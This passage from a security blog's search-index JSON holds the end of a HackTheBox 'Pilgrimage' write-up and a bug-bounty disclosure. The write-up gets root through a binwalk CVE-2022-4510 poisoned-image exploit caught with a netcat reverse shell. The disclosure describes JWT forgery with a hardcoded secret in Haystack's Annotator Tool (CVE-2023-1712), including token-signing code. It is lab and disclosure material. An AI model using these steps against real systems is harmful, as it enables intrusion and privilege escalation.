/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=\u0026#34;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \u0026#34;$FILE\u0026#34; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e \u0026#39;s/^.*CREATE //p\u0026#39;)\u0026#34; binout=\u0026#34;$(/usr/local/bin/binwalk -e \u0026#34;$filename\u0026#34;)\u0026#34; for banned in \u0026#34;${blacklist[@]}\u0026#34;; do if [[ \u0026#34;$binout\u0026#34; == *\u0026#34;$banned\u0026#34;* ]]; then /usr/bin/rm \u0026#34;$filename\u0026#34; break fi done done Essentially this script uses inotifywait to listen for CREATE events happening in the /var/www/pilgrimage.htb/shrunk/ directory, which is the directory the uploaded images from the web application sit, and uses binwalk to search for malicious content inside them.\nThe version of binwalk used by the server is v2.3.2 which is vulnerable and has CVE-2022-4510. Using this poc from exploit db. I can create a malicious image, upload it to the server and wait for the scipt /usr/sbin/malwarescan.sh to run. Binwalk will proc the exploit to fire and me having setup a listening reverse shell will login as root.\npython3 scripts/exploit.py image.png 10.10.14.139 4001 scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/binwalk_exploit.png nc -lv 4001 And thus the pilgrimage ends!\nCVE stands for Common Vulnerabilities and Exposures which are publicly disclosed vulnerabities in software reported by security researchers and ethical hacker, just like this.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"26 July 2023","permalink":"/boxes/htb-pilgrimage/","section":"Boxes","summary":"Introduction # Pilgrimage is a machine by HackTheBox created by user coopertim13.","title":"HTB Pilgrimage"},{"content":"","date":"26 July 2023","permalink":"/tags/image-poisoning/","section":"Tags","summary":"","title":"image poisoning"},{"content":"","date":"21 July 2023","permalink":"/bug-bounty/","section":"Bug-bounties","summary":"","title":"Bug-bounties"},{"content":"","date":"21 July 2023","permalink":"/tags/docker/","section":"Tags","summary":"","title":"docker"},{"content":" JWT Token Forgery for Haystack\u0026rsquo;s Annotator Tool (CVE-2023-1712) # Introduction # The purpose of this disclosure is to ethically report a web vulnerability found in the Annotator Tool. By analyzing the provided docker image, it was possible to gain access to the source code and identify a critical security flaw related to the generation of JSON Web Tokens (JWTs). This vulnerability allows low-level users to escalate their privileges and perform actions that were previously restricted.\nVulnerability Details # The vulnerability stems from a hardcoded value found in the configuration file config/config.production.js. Specifically, the value of config.jwt.secret = Hm************tA is used to sign JWT tokens. Exploiting this weakness enables an attacker to create new JWT tokens with the \u0026ldquo;super_admin\u0026rdquo; role, granting unauthorized access and privileges.\nExploitation Method # To exploit this vulnerability, the attacker needs to replicate the token generation process used by the application. This can be achieved by modifying the existing back-end code of the annotation tool. The following lines can be added to the getSignedJWT function in app/service/userService.js:\nconst fs = require(\u0026#34;fs\u0026#34;); let x = this.app.jwt.sign( { id: 2, email: \u0026#34;r4F705@proxy.com\u0026#34;, role: \u0026#34;super_admin\u0026#34;, }, \u0026#34;Hm************tA\u0026#34; ); fs.writeFile(\u0026#34;/tmp/test.txt\u0026#34;, x, (err) =\u0026gt; { if (err) { console.error(err); } }); By incorporating this code snippet into a modified version of the back-end, the attacker can host a local instance of the application. Logging in with a regular user account on the modified instance will generate a new JWT token with the \u0026ldquo;super_admin\u0026rdquo; role. To utilize this forged token, the attacker can retrieve it from /tmp/test.txt within the running container or the host system. Then, by updating the value of the \u0026ldquo;dpst-token\u0026rdquo; found in the browser\u0026rsquo;s local storage for the original login domain, the attacker can assume the elevated privileges associated with the \u0026ldquo;super_admin\u0026rdquo; role.\nlogged in as admin at deepset.ai Impact # This vulnerability has significant implications for all current versions of the annotation tool, regardless of whether they are hosted online or within a company\u0026rsquo;s internal network. Since the containers utilized by the tool share the same secret key, any forged tokens created using the vulnerability will be effective across all instances of the tool.\nThe impact of this vulnerability is twofold, affecting both the integrity and availability of the tool and its associated data. Exploiting the vulnerability allows an attacker to gain super admin access without the need for a valid account, posing a severe security risk. With super admin privileges, an attacker can masquerade as any other user, leading to unauthorized modifications to the annotation process and the potential corruption of valuable training data for QA models. As a result, the reliability and trustworthiness of the annotation tool\u0026rsquo;s outputs are compromised.\nFurthermore, an attacker can leverage scripted attacks to remove created users, significantly impeding the functionality and usability of the tool. The removal of user accounts can disrupt workflows and impede collaboration, rendering the tool\u0026rsquo;s usage challenging and hindering productivity.\nOriginally reported on huntr\n","date":"21 July 2023","permalink":"/bug-bounty/haystack/","section":"Bug-bounties","summary":"JWT Token Forgery for Haystack\u0026rsquo;s Annotator Tool (CVE-2023-1712) # Introduction # The purpose of this disclosure is to ethically report a web vulnerability found in the Annotator Tool.","title":"Haystack"},{"content":"","date":"21 July 2023","permalink":"/tags/jwt/","section":"Tags","summary":"","title":"jwt"},{"content":"","date":"21 July 2023","permalink":"/tags/reversing/","section":"Tags","summary":"","title":"reversing"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]